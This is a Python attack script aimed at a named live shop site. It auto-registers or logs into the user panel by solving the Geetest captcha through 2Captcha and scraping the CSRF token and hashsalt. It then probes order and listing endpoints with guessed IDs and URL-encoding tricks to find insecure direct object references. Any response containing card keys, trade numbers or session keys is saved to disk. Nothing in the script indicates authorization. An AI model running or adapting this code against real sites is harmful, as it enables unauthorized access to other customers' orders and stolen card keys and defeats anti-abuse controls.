#!/usr/bin/env python3
"""Register + login on siye.lol user panel via Geetest/2Captcha, then probe IDOR."""
from __future__ import annotations

import json
import os
import re
import subprocess
import sys
import time
import urllib.parse
import urllib.request
from http.cookiejar import MozillaCookieJar
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from geetest_2captcha import solve_geetest_v3  # noqa: E402

BASE = "https://siye.lol/shop"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0 Safari/537.36"
OUT = Path("/workspace/siye/results/spray")
OUT.mkdir(parents=True, exist_ok=True)
CK = OUT / "user.ck"
LOG = OUT / "user_reg.log"

# load 2captcha env
envp = Path(__file__).resolve().parent / "2captcha.env"
if envp.exists():
    for line in envp.read_text().splitlines():
        if "=" in line and not line.strip().startswith("#"):
            k, v = line.strip().split("=", 1)
            os.environ.setdefault(k, v)


def log(m: str) -> None:
    line = f"[{time.strftime('%H:%M:%S')}] {m}"
    print(line, flush=True)
    with LOG.open("a") as f:
        f.write(line + "\n")


def opener():
    jar = MozillaCookieJar(str(CK))
    if CK.exists():
        try:
            jar.load(ignore_discard=True, ignore_expires=True)
        except Exception:
            pass
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
    return op, jar


def req(op, url, data=None, referer=None, timeout=20):
    headers = {
        "User-Agent": UA,
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest",
    }
    if referer:
        headers["Referer"] = referer
    body = None
    if data is not None:
        if isinstance(data, dict):
            body = urllib.parse.urlencode(data).encode()
            headers["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
        else:
            body = data
    r = urllib.request.Request(url, data=body, headers=headers)
    with op.open(r, timeout=timeout) as resp:
        raw = resp.read()
        return resp.status, raw.decode("utf-8", "ignore")


def decode_hashsalt(html: str) -> str:
    m = re.search(r"var hashsalt=(.+?);</script>", html)
    if not m:
        return ""
    r = subprocess.run(
        ["node", "-e", "console.log(" + m.group(1) + ")"],
        capture_output=True,
        text=True,
        timeout=5,
    )
    return r.stdout.strip()


def get_captcha(op) -> dict:
    url = f"{BASE}/ajax.php?act=captcha&t={int(time.time()*1000)}"
    code, body = req(op, url, referer=f"{BASE}/user/reg.php")
    log(f"captcha {code} {body[:200]}")
    return json.loads(body)


def main() -> None:
    user = f"sy{int(time.time())%1000000}"
    pwd = "SyTest9x!"
    qq = "358912345"
    op, jar = opener()
    # warm
    req(op, BASE + "/", referer=None)
    code, reghtml = req(op, BASE + "/user/reg.php")
    (OUT / "reg_live.html").write_text(reghtml)
    hashsalt = decode_hashsalt(reghtml)
    csrf = (re.findall(r'csrf_token\s*=\s*"([^"]+)"', reghtml) or [""])[0]
    log(f"user={user} hashsalt={hashsalt} csrf={csrf[:16]}...")

    cap = get_captcha(op)
    gt = cap.get("gt")
    challenge = cap.get("challenge")
    if not gt or not challenge:
        log(f"bad captcha payload: {cap}")
        return
    log(f"solving geetest gt={gt} challenge={challenge[:20]}...")
    sol = solve_geetest_v3(gt=gt, challenge=challenge, pageurl=BASE + "/user/reg.php")
    log(f"sol={sol}")
    data = {
        "user": user,
        "pwd": pwd,
        "qq": qq,
        "hashsalt": hashsalt,
        "geetest_challenge": sol["geetest_challenge"],
        "geetest_validate": sol["geetest_validate"],
        "geetest_seccode": sol["geetest_seccode"],
        "csrf_token": csrf,
    }
    code, body = req(op, BASE + "/user/ajax.php?act=reguser", data=data, referer=BASE + "/user/reg.php")
    log(f"reguser => {code} {body}")
    (OUT / "reguser.json").write_text(body)
    jar.save(ignore_discard=True, ignore_expires=True)

    # login if needed
    if '"code":1' in body or '"code":0' in body or "成功" in body:
        log("reg ok-ish; probing panel")
    else:
        # try login anyway with solved captcha flow
        code, loginhtml = req(op, BASE + "/user/login.php")
        hashsalt = decode_hashsalt(loginhtml) or hashsalt
        csrf = (re.findall(r'csrf_token\s*=\s*"([^"]+)"', loginhtml) or [csrf])[0]
        cap = get_captcha(op)
        sol = solve_geetest_v3(gt=cap["gt"], challenge=cap["challenge"], pageurl=BASE + "/user/login.php")
        log(f"login sol={sol}")
        data = {
            "user": user,
            "pass": pwd,
            "pwd": pwd,
            "hashsalt": hashsalt,
            "geetest_challenge": sol["geetest_challenge"],
            "geetest_validate": sol["geetest_validate"],
            "geetest_seccode": sol["geetest_seccode"],
            "csrf_token": csrf,
        }
        code, body = req(op, BASE + "/user/ajax.php?act=login", data=data, referer=BASE + "/user/login.php")
        log(f"login => {code} {body}")
        (OUT / "login.json").write_text(body)
        jar.save(ignore_discard=True, ignore_expires=True)

    # panel probes
    probes = [
        ("GET", f"{BASE}/user/"),
        ("GET", f"{BASE}/user/index.php"),
        ("GET", f"{BASE}/%61pi.php?act=orders&limit=5"),
        ("GET", f"{BASE}/%61pi.php?act=search&id=1"),
        ("GET", f"{BASE}/user/ajax.php?act=order&id=1"),
        ("GET", f"{BASE}/user/ajax.php?act=orders&page=1"),
        ("GET", f"{BASE}/ajax.php?act=order&id=1"),
        ("GET", f"{BASE}/ajax.php?act=orders&page=1"),
        ("POST", f"{BASE}/user/ajax.php?act=orderlist", {"page": "1", "limit": "20"}),
        ("POST", f"{BASE}/user/ajax.php?act=list", {"page": "1"}),
    ]
    for method, url, *rest in probes:
        try:
            if method == "GET":
                code, body = req(op, url, referer=BASE + "/user/")
            else:
                code, body = req(op, url, data=rest[0], referer=BASE + "/user/")
            snip = body.replace("\n", " ")[:220]
            log(f"PROBE {method} {url.split('/shop/')[-1]} => {code} {snip}")
            if any(x in body for x in ("kami", "卡密", "kmdata", "trade_no", "skey")):
                safe = url.split("act=")[-1].split("&")[0] if "act=" in url else "idx"
                (OUT / f"panel_{safe}.txt").write_text(body[:8000])
                log(f"interesting panel body saved panel_{safe}.txt")
        except Exception as e:
            log(f"PROBE err {url}: {e}")

    (OUT / "creds.json").write_text(json.dumps({"user": user, "pwd": pwd, "qq": qq}, indent=2))
    log("done")


if __name__ == "__main__":
    main()
